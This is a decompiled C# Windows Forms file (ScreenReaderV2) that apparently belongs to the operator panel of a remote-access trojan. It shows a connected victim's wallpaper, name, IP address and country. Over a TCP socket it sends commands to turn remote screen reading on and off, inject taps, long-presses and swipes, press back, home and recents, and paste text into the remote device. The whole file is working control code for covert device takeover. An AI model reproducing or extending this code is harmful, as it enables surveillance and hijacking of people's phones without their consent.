using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using DrakeUI.Framework;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020000B8 RID: 184
[DesignerGenerated]
public partial class ScreenReaderV2 : Form
{
	// Token: 0x060007A8 RID: 1960 RVA: 0x000B60B0 File Offset: 0x000B42B0
	public ScreenReaderV2()
	{
		base.Load += this.ScreenReaderV2_Load;
		base.FormClosing += this.ScreenReaderV2_FormClosing;
		this.isclick = false;
		this.Swaping = false;
		this.isdown = false;
		this.ScreenShotFoucs = false;
		this.Recordit = false;
		this.Rnew = 0;
		this.Title = "null";
		this.tiks = 0;
		this.InitializeComponent();
	}

	// Token: 0x060007A9 RID: 1961 RVA: 0x000B612C File Offset: 0x000B432C
	private void ScreenReaderV2_Load(object sender, EventArgs e)
	{
		try
		{
			this.ClientPic.Image = this.classClient.Wallpaper;
			this.clinameinfo.Text = string.Concat(new string[]
			{
				"Name: ",
				this.classClient.ClientName,
				Strings.Space(2),
				"IP: ",
				this.classClient.ClientAddressIP,
				Strings.Space(2),
				"Country: ",
				this.classClient.Country
			});
			if (this.classClient != null)
			{
				TcpClient myClient = this.classClient.myClient;
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"SCRD2<*>o",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060007AA RID: 1962 RVA: 0x0000206C File Offset: 0x0000026C
	private void Savetimer_Tick(object sender, EventArgs e)
	{
	}

	// Token: 0x060007AB RID: 1963 RVA: 0x00003579 File Offset: 0x00001779
	private void Presstimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			this.tiks++;
		}
	}

	// Token: 0x060007AC RID: 1964 RVA: 0x0003D520 File Offset: 0x0003B720
	public string asab(string input)
	{
		string[] array = input.Replace("​", " ").Split(new char[]
		{
			' '
		});
		string text = "";
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			if (text2.Length > 0)
			{
				text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
			}
		}
		return text;
	}

	// Token: 0x060007AD RID: 1965 RVA: 0x000B62E8 File Offset: 0x000B44E8
	private void Enablebtn_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			TcpClient myClient = this.classClient.myClient;
			string[] array = this.classClient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"SCRD2<*>o",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060007AE RID: 1966 RVA: 0x00003589 File Offset: 0x00001789
	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		this.viewpic.Image = Codes.BlankImage();
	}

	// Token: 0x060007AF RID: 1967 RVA: 0x000B6400 File Offset: 0x000B4600
	private void Disablebtn_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			TcpClient myClient = this.classClient.myClient;
			string[] array = this.classClient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"SCRD2<*>f",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060007B0 RID: 1968 RVA: 0x000B6518 File Offset: 0x000B4718
	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>Bc",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007B1 RID: 1969 RVA: 0x000B6644 File Offset: 0x000B4844
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>Ho",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007B2 RID: 1970 RVA: 0x000B6770 File Offset: 0x000B4970
	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>RC",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007B3 RID: 1971 RVA: 0x0000206C File Offset: 0x0000026C
	private void Livepicbox_MouseDown(object sender, MouseEventArgs e)
	{
	}

	// Token: 0x060007B4 RID: 1972 RVA: 0x0000206C File Offset: 0x0000026C
	private void Livepicbox_MouseUp(object sender, MouseEventArgs e)
	{
	}

	// Token: 0x060007B5 RID: 1973 RVA: 0x0000206C File Offset: 0x0000026C
	private void Livepicbox_MouseMove(object sender, MouseEventArgs e)
	{
	}

	// Token: 0x060007B6 RID: 1974 RVA: 0x000B689C File Offset: 0x000B4A9C
	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		this.ScreenShotFoucs = false;
		if (e.Button == MouseButtons.Left)
		{
			this.Trakpoint = new List<Point>();
			this.Trakpoint.Add(new Point(e.X, e.Y));
			this.isclick = false;
			this.isdown = true;
		}
		else
		{
			this.presstimer.Enabled = true;
			this.isclick = true;
		}
	}

	// Token: 0x060007B7 RID: 1975 RVA: 0x000B690C File Offset: 0x000B4B0C
	private void Viewpic_MouseMove(object sender, MouseEventArgs e)
	{
		if (this.isdown)
		{
			this.Swaping = true;
			this.isclick = false;
			this.Trakpoint.Add(new Point(e.X, e.Y));
		}
	}

	// Token: 0x060007B8 RID: 1976 RVA: 0x000B694C File Offset: 0x000B4B4C
	private void Viewpic_MouseUp(object sender, MouseEventArgs e)
	{
		this.isdown = false;
		int width = this.viewpic.Width;
		int height = this.viewpic.Height;
		checked
		{
			if (!this.isclick)
			{
				if (this.Swaping)
				{
					this.Swaping = false;
					this.Trakpoint.Add(new Point(e.X, e.Y));
					StringBuilder stringBuilder = new StringBuilder();
					foreach (Point point in this.Trakpoint)
					{
						stringBuilder.Append(new Point((int)Math.Round(unchecked((double)point.X * ((double)this.ScreenSize.Width / (double)width))), (int)Math.Round(unchecked((double)point.Y * ((double)this.ScreenSize.Height / (double)height)))).ToString() + ":");
					}
					string[] array = this.classClient.Keys.Split(new char[]
					{
						':'
					});
					object[] parametersObjects = new object[]
					{
						this.Client,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>",
							stringBuilder.ToString(),
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.classClient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(parametersObjects);
				}
			}
			else
			{
				this.presstimer.Enabled = false;
				this.presstimer.Stop();
				string text = "clk:";
				if (this.tiks > 3)
				{
					text = "clk:hold:";
				}
				this.tiks = 0;
				Point point2 = this.viewpic.PointToClient(Control.MousePosition);
				Point point3 = new Point((int)Math.Round(unchecked((double)point2.X * ((double)this.ScreenSize.Width / (double)width))), (int)Math.Round(unchecked((double)point2.Y * ((double)this.ScreenSize.Height / (double)height))));
				text = text + point3.X.ToString() + ":" + point3.Y.ToString();
				string[] array2 = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects2 = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>",
						text,
						Data.SPL_SOCKET,
						array2[0],
						Data.SPL_SOCKET,
						array2[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects2);
			}
		}
	}

	// Token: 0x060007B9 RID: 1977 RVA: 0x000B6400 File Offset: 0x000B4600
	private void ScreenReaderV2_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (this.classClient != null)
		{
			TcpClient myClient = this.classClient.myClient;
			string[] array = this.classClient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"SCRD2<*>f",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060007BA RID: 1978 RVA: 0x000B6D3C File Offset: 0x000B4F3C
	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
		if (this.classClient != null && this.textsend.Text.Length > 0)
		{
			object[] parametersObjects = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"pst<*>",
					this.textsend.Text,
					Data.SPL_SOCKET,
					"0",
					Data.SPL_SOCKET,
					"0",
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
			this.textsend.Text = "";
		}
	}

	// Token: 0x060007BB RID: 1979 RVA: 0x000B6E70 File Offset: 0x000B5070
	private void DrakeUIAvatar1_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>En",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007BC RID: 1980 RVA: 0x000B6770 File Offset: 0x000B4970
	private void Button7_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>RC",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007BD RID: 1981 RVA: 0x000B6644 File Offset: 0x000B4844
	private void Button6_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>Ho",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007BE RID: 1982 RVA: 0x000B6518 File Offset: 0x000B4718
	private void Button5_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			try
			{
				string[] array = this.classClient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.classClient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>Bc",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.classClient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060007BF RID: 1983 RVA: 0x000B6D3C File Offset: 0x000B4F3C
	private void Enterbutton_Click(object sender, EventArgs e)
	{
		if (this.classClient != null && this.textsend.Text.Length > 0)
		{
			object[] parametersObjects = new object[]
			{
				this.classClient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"pst<*>",
					this.textsend.Text,
					Data.SPL_SOCKET,
					"0",
					Data.SPL_SOCKET,
					"0",
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
			this.textsend.Text = "";
		}
	}

	// Token: 0x060007C0 RID: 1984 RVA: 0x000B62E8 File Offset: 0x000B44E8
	private void guna2Button1_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			TcpClient myClient = this.classClient.myClient;
			string[] array = this.classClient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"SCRD2<*>o",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.classClient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x04000AE1 RID: 2785
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	// Token: 0x04000AE2 RID: 2786
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("disablebtn")]
	private DrakeUIButtonIcon _disablebtn;

	// Token: 0x04000AE3 RID: 2787
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("enablebtn")]
	private DrakeUIButtonIcon _enablebtn;

	// Token: 0x04000AE4 RID: 2788
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	// Token: 0x04000AE5 RID: 2789
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	// Token: 0x04000AE6 RID: 2790
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	// Token: 0x04000AE7 RID: 2791
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("presstimer")]
	private Timer _presstimer;

	// Token: 0x04000AE8 RID: 2792
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Save")]
	private DrakeUICheckBox _Save;

	// Token: 0x04000AE9 RID: 2793
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savetimer")]
	private Timer _savetimer;

	// Token: 0x04000AEA RID: 2794
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("viewpic")]
	private PictureBox _viewpic;

	// Token: 0x04000AEB RID: 2795
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	// Token: 0x04000AEC RID: 2796
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	// Token: 0x04000AED RID: 2797
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("hidetoolbtn")]
	private DrakeUIButtonIcon _hidetoolbtn;

	// Token: 0x04000AEE RID: 2798
	private bool isclick;

	// Token: 0x04000AEF RID: 2799
	private bool Swaping;

	// Token: 0x04000AF0 RID: 2800
	private bool isdown;

	// Token: 0x04000AF1 RID: 2801
	private List<Point> Trakpoint;

	// Token: 0x04000AF2 RID: 2802
	public TcpClient Client;

	// Token: 0x04000AF3 RID: 2803
	public Client ScreenClass;

	// Token: 0x04000AF4 RID: 2804
	public Client classClient;

	// Token: 0x04000AF5 RID: 2805
	public string DownloadsFolder;

	// Token: 0x04000AF6 RID: 2806
	public string RecordName;

	// Token: 0x04000AF7 RID: 2807
	public Size ScreenSize;

	// Token: 0x04000AF8 RID: 2808
	public bool LIVE;

	// Token: 0x04000AF9 RID: 2809
	public bool ScreenShotFoucs;

	// Token: 0x04000AFA RID: 2810
	public bool Recordit;

	// Token: 0x04000AFB RID: 2811
	public int Rnew;

	// Token: 0x04000AFC RID: 2812
	public string Title;

	// Token: 0x04000AFD RID: 2813
	private int tiks;
}
